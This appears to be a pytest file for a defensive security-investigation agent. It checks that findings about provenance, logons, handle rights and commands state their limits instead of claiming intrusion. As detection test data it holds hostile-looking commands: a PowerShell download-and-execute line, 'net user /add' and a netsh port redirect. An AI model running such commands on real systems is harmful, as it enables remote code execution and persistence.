"""Behavioral security semantics tests: no scenario IDs or hardcoded verdicts."""
from __future__ import annotations

from types import SimpleNamespace

from bluesec1_agent.security_reasoning import collect_security_findings, security_case_summary


def memory(nodes=None, edges=None):
    nodes = nodes or {}
    edges = edges or {}
    return SimpleNamespace(observed_nodes=nodes, graph_edges=edges,
                           relation_ids=set(edges))


def binary_pair(*, same_host=True, same_path=True, hash_equal=True, write=True):
    digest = "a" * 64
    fid, pid = "file1", "proc2"
    fp = "C:\\ProgramData\\app.exe"
    pp = fp if same_path else "C:\\Elsewhere\\app.exe"
    nodes = {
        fid: {"id": fid, "type": "windows_file", "host_id": "h1",
              "properties": {"sha256": digest, "path": fp}},
        pid: {"id": pid, "type": "windows_process", "host_id": "h1" if same_host else "h2",
              "properties": {"sha256": digest if hash_equal else "b" * 64,
                             "image_path": pp, "user": "COMPANY\\operator"}},
    }
    edges = {"rel1": ("wrote_file", "writer", fid)} if write else {}
    return memory(nodes, edges)


def test_exact_hash_and_path_prove_separate_process_observation():
    facts = collect_security_findings(binary_pair())
    assert len(facts) == 1
    assert facts[0].kind == "file-process-provenance"
    assert "matches a separate observed PROCESS" in facts[0].observation
    assert "does NOT establish" in facts[0].limitation
    assert "malicious" not in facts[0].kind


def test_hash_mismatch_does_not_join_process():
    assert not collect_security_findings(binary_pair(hash_equal=False))


def test_different_host_does_not_join_process():
    assert not collect_security_findings(binary_pair(same_host=False))


def test_different_path_does_not_join_process():
    assert not collect_security_findings(binary_pair(same_path=False))


def test_matching_binary_without_observed_write_keeps_observation_weak():
    facts = collect_security_findings(binary_pair(write=False))
    assert len(facts) == 1
    assert "observed file" in facts[0].observation
    assert "written in observed graph" not in facts[0].observation


def test_failed_authentication_is_not_called_successful_intrusion():
    nodes = {
        "e1": {"type": "logged_on_to", "logon_properties": {"auth_failed": True,
                  "source_ip": "10.4.3.2"}},
        "e2": {"type": "logged_on_to", "logon_properties": {"auth_failed": True,
                  "source_ip": "10.4.3.2"}},
    }
    facts = collect_security_findings(memory(nodes, {
        "e1": ("logged_on_to", "u", "h"), "e2": ("logged_on_to", "u", "h")}))
    assert len(facts) == 1
    assert "failed=2, successful=0" in facts[0].observation
    assert "NOT successful intrusion" in facts[0].limitation


def test_successful_authentication_stays_successful():
    nodes = {"e1": {"auth_failed": False}}
    facts = collect_security_findings(memory(nodes, {"e1": ("logged_on_to", "u", "h")}))
    assert not facts  # One successful event has no repeated-abuse conclusion.


def test_failed_attempts_are_separated_by_target():
    nodes = {f"r{i}": {"auth_failed": True, "source_ip": "192.168.1.5"}
             for i in range(3)}
    facts = collect_security_findings(memory(nodes, {
        "r0": ("logged_on_to", "u", "h1"),
        "r1": ("logged_on_to", "u", "h1"),
        "r2": ("logged_on_to", "u", "h2")}))
    assert len(facts) == 2
    assert sorted("failed=2" in f.observation for f in facts) == [False, True]


def test_http_post_is_not_dynamic_code_execution():
    m = memory({"p": {"type": "windows_process", "properties": {
        "script_text": "Invoke-WebRequest -Method POST -Uri https://monitor.local/api/health "
                       "-Body '{\"status\":\"ok\"}'"}}})
    kinds = [f.kind for f in collect_security_findings(m)]
    assert kinds == ["command-capability:web-request"]


def test_explicit_dynamic_loading_has_own_semantics():
    m = memory({"p": {"type": "windows_process", "properties": {
        "cmdline": "powershell.exe -c IEX ([Net.WebClient]::new().DownloadString('https://a'))"}}})
    assert "command-capability:dynamic-code-loading" in [f.kind for f in collect_security_findings(m)]


def test_process_handle_query_only_is_not_read_permission():
    m = memory({"r": {"type": "opened_handle_to", "granted_access": "0x1000"}},
               {"r": ("opened_handle_to", "edr", "other")})
    fact = collect_security_findings(m)[0]
    assert "no documented memory-read right" in fact.observation
    assert "PROCESS_QUERY_LIMITED_INFORMATION=YES" in fact.observation


def test_process_handle_read_capability_is_not_dump_proof():
    m = memory({"r": {"type": "opened_handle_to", "granted_access": "0x1010"}},
               {"r": ("opened_handle_to", "p", "q")})
    fact = collect_security_findings(m)[0]
    assert "memory-reading right granted" in fact.observation
    assert "does not demonstrate memory dumping" in fact.limitation


def test_command_intent_does_not_claim_rule_was_created():
    m = memory({"p": {"type": "windows_process", "properties": {
        "cmdline": "netsh interface portproxy add v4tov4 listenport=8443 connectaddress=10.1.1.1"}}})
    fact = collect_security_findings(m)[0]
    assert "network-redirect" in fact.kind
    assert "not necessarily success or abuse" in fact.limitation


def test_nonsecurity_command_does_not_invent_high_risk_action():
    assert not collect_security_findings(memory({"p": {"type": "windows_process", "properties": {
        "cmdline": "notepad.exe README.txt"}}}))


def test_summary_is_small_and_explicitly_not_a_verdict():
    nodes = {str(i): {"type": "windows_process", "properties": {
        "cmdline": "net user /add example" if i%2 else
                   "curl https://example.org/test"}} for i in range(20)}
    s = security_case_summary(memory(nodes), limit=2, max_chars=1000)
    assert s.count("[command-capability:") <= 2
    assert len(s) <= 1000
    assert "LIMIT:" in s


def test_agent_dossier_receives_exact_correlated_ids():
    from bluesec1_agent.agent import InvestigationMemory
    from bluesec1_agent.investigation_director import InvestigationDirector

    m = InvestigationMemory()
    source = 'c4bd0583-f6d5-4401-b31b-1cb6b4a74d61'
    payload = '944a7c63-6087-4a46-9395-e6cb132b7e45'
    running = '76a915af-f520-4126-85d4-c9c8aef0e560'
    m.focus_ids.add(source)
    m.absorb({'id': source, 'type': 'windows_process', 'host_id': 'machine',
              'properties': {'cmdline': 'powershell.exe', 'user': 'OPS\\operator'}})
    m.absorb({'id': payload, 'type': 'windows_file', 'host_id': 'machine',
              'properties': {'sha256': 'd' * 64, 'path': 'C:\\Temp\\payload.exe'}})
    m.absorb({'id': 'relation', 'type': 'wrote_file', 'source_id': source,
              'target_id': payload})
    # A separate query/search response without a graph relation to its result.
    m.absorb({'results': [{'id': running, 'type': 'windows_process', 'host_id': 'machine',
                          'properties': {'sha256': 'd' * 64,
                                         'image_path': 'C:\\Temp\\payload.exe',
                                         'cmdline': 'C:\\Temp\\payload.exe'}}]})
    dossier = InvestigationDirector().review_dossier(m)
    assert '[file-process-provenance;' in dossier
    assert payload in dossier and running in dossier
    assert 'hash equality alone does NOT establish' in dossier


def test_ad_object_role_does_not_create_authorization_finding():
    m = memory({'account': {'id': 'account', 'type': 'windows_user',
                           'properties': {'group_memberships': ['Administrators'],
                                          'username': 'ADMIN\\svc'}}})
    assert not collect_security_findings(m)
